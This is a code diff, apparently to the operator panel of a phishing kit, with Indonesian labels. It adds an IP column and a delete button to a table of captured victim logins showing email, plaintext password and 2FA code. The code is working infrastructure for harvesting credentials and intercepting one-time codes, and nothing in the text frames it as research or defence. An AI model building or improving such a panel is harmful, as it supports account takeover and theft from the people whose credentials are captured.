@@ -24,6 +24,8 @@ tr:hover td{background:#f8f9ff}
 .empty{text-align:center;color:#999;padding:40px!important}
 .stats{margin-bottom:15px;font-size:13px;color:#666}
 .logout{float:right;font-size:13px;color:#0095f6;cursor:pointer;text-decoration:none}
+.btn-del{background:#e74c3c;color:#fff;border:none;padding:5px 12px;border-radius:6px;font-size:12px;cursor:pointer}
+.btn-del:hover{background:#c0392b}
 @media(prefers-color-scheme:dark){
 body{background:#0a0a0a;color:#e4e4e4}
 .login-box,table,th,td{background:#1a1a1a}
@@ -40,7 +42,7 @@ tr:hover td{background:#222}
 <h1>Admin Panel <a href="#" class="logout" onclick="logout()">Logout</a></h1>
 <div class="stats" id="stats"></div>
 <table>
-<thead><tr><th>ID</th><th>Email</th><th>Password</th><th>2FA Code</th><th>Waktu</th></tr></thead>
+<thead><tr><th>ID</th><th>Email</th><th>Password</th><th>2FA Code</th><th>IP</th><th>Waktu</th><th>Aksi</th></tr></thead>
 <tbody id="tbody"></tbody>
 </table>
 </div>
@@ -71,7 +73,7 @@ if(d.error&&r.status===401){throw new Error('Token salah')}
 var tbody=document.getElementById('tbody');
 tbody.innerHTML='';
 if(!d.data||d.data.length===0){
-tbody.innerHTML='<tr><td class="empty" colspan="5">Belum ada data login</td></tr>';
+tbody.innerHTML='<tr><td class="empty" colspan="7">Belum ada data login</td></tr>';
 document.getElementById('stats').textContent='Total: 0';
 return;
 }
@@ -79,7 +81,14 @@ document.getElementById('stats').textContent='Total: '+d.data.length;
 d.data.forEach(function(row){
 var tr=document.createElement('tr');
 var time=new Date(row.created_at).toLocaleString('id-ID');
-tr.innerHTML='<td>'+row.id+'</td><td>'+esc(row.email)+'</td><td>'+esc(row.password)+'</td><td class="code">'+(row.code||'-')+'</td><td>'+time+'</td>';
+var delBtn=document.createElement('button');
+delBtn.className='btn-del';
+delBtn.textContent='Hapus';
+delBtn.onclick=function(){hapus(row.id)};
+var tdAksi=document.createElement('td');
+tdAksi.appendChild(delBtn);
+    tr.innerHTML='<td>'+row.id+'</td><td>'+esc(row.email)+'</td><td>'+esc(row.password)+'</td><td class="code">'+(row.code||'-')+'</td><td>'+esc(row.ip_address||'-')+'</td><td>'+time+'</td>';
+tr.appendChild(tdAksi);
 tbody.appendChild(tr)
 })
 }catch(e){
@@ -90,6 +99,16 @@ localStorage.removeItem('panel_token')
 }
 }
 function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}
+
+async function hapus(id){
+if(!confirm('Hapus login ID '+id+'?'))return;
+try{
+var r=await fetch('/api/delete-login?token='+encodeURIComponent(getToken()),{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id})});
+var d=await r.json();
+if(d.error)throw new Error(d.error);
+loadData()
+}catch(e){alert('Gagal: '+e.message)}
+}
 
 var saved=getToken();
 if(saved){
